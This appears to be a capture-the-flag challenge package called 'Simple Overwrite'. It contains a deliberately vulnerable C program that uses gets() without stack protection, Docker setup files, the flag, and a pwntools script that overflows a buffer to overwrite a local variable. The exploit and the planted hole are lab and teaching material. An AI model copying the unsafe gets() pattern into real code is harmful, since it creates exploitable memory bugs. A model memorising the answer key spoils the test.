{
    "Dockerfile": "FROM 32bit/ubuntu:16.04\n\nRUN apt update\nRUN apt install -y socat gdb\n\nRUN groupadd ctf\n\nRUN mkdir /pwn\n\nCOPY pwn1 /pwn/pwn1\nCOPY flag.txt /pwn/flag.txt\nCOPY entry.sh /pwn/entry.sh\n\nRUN useradd -G ctf --home=/pwn pwnuser\nRUN useradd -G ctf --home=/pwn pwnflag\n\nRUN chown pwnflag:pwnflag /pwn/flag.txt\nRUN chown pwnflag:pwnflag /pwn/pwn1\nRUN chown pwnflag:pwnflag /pwn\n\nRUN chmod 4755 /pwn/pwn1\nRUN chmod 444 /pwn/flag.txt\nRUN chmod 4755 /pwn/entry.sh\n\nEXPOSE 4321\nENTRYPOINT [\"/pwn/entry.sh\"]\n",
    "entry.sh": "#!/bin/bash\n\nwhile : \ndo\n    su -c \"exec socat TCP-LISTEN:4321,reuseaddr,fork EXEC:/pwn/pwn1,stderr\" - pwnuser;\ndone\n",
    "flag.txt": "gigem{34sy_CC428ECD75A0D392}\n",
    "Makefile": "all: pwn\n\npwn: over_write_var.c\n\tgcc -fno-stack-protector -m32 over_write_var.c -o pwn1\n\n",
    "over_write_pwn.py": "from pwn import *\n\np = remote('172.17.0.2', 4321)\n\n#p = process('./pwn1')\nflag = p32(0xdea110c8)\npayload = 'A'*43 + flag\np.sendline('Sir Lancelot of Camelot')\np.read()\np.sendline('To seek the Holy Grail.')\np.read()\np.sendline(payload)\np.interactive()\n",
    "over_write_var.c": "#include <stdio.h>\n#include <stdlib.h>\n\nvoid print_flag()\n{\n    printf(\"Right. Off you go.\\n\");\n    FILE* fp = fopen(\"flag.txt\", \"r\");\n    \n    char ch;\n    while((ch = getc(fp)) != EOF)\n        printf(\"%c\",ch);\n    printf(\"\\n\");\n}\n\nint main()\n{\n    setvbuf(stdout,_IONBF,0,0);\n    int junk = 2;\n    int secret = 0;\n    char answer[43];\n    printf(\"Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.\\n\");\n    printf(\"What... is your name?\\n\");\n    fgets(answer, 43, stdin);\n    if( strcmp(answer,\"Sir Lancelot of Camelot\\n\") != 0) {\n        printf(\"I don't know that! Auuuuuuuugh!\\n\");\n        exit(0);\n    }\n\n    printf(\"What... is your quest?\\n\");\n    fgets(answer, 43, stdin);\n    if( strcmp(answer,\"To seek the Holy Grail.\\n\") != 0) {\n        printf(\"I don't know that! Auuuuuuuugh!\\n\");\n        exit(0);\n    }\n\n    printf(\"What... is my secret?\\n\");\n    gets(answer);\n    if(secret == 0xdea110c8)\n        print_flag();\n    else\n        printf(\"I don't know that! Auuuuuuuugh!\\n\");\n}\n",
    "pwn1": "[Binary file or unsupported type: c:\\users\\jomue\\tamuctf-2019-master\\tamuctf-2019-master\\pwn\\pwn1\\pwn1]",
    "README.md": "# Simple Overwrite\n\n## Challenge\n`nc pwn.tamuctf.com 4321`  \n\n## Setup\n\nBuild the container with `docker build -t pwn1 .` and run it with `docker run -it --rm pwn1`\n\n## Solution\nThe solution is to overwrite the localvariable. Below is an expample script:  \n```python\nfrom pwn import *\n\np = remote('172.17.0.2', 4321)\n\n#p = process('./pwn1')\nflag = p32(0xdea110c8)\npayload = 'A'*43 + flag\np.sendline('Sir Lancelot of Camelot')\np.read()\np.sendline('To seek the Holy Grail.')\np.read()\np.sendline(payload)\np.interactive()\n```\n",
    "category": "Pwn"
}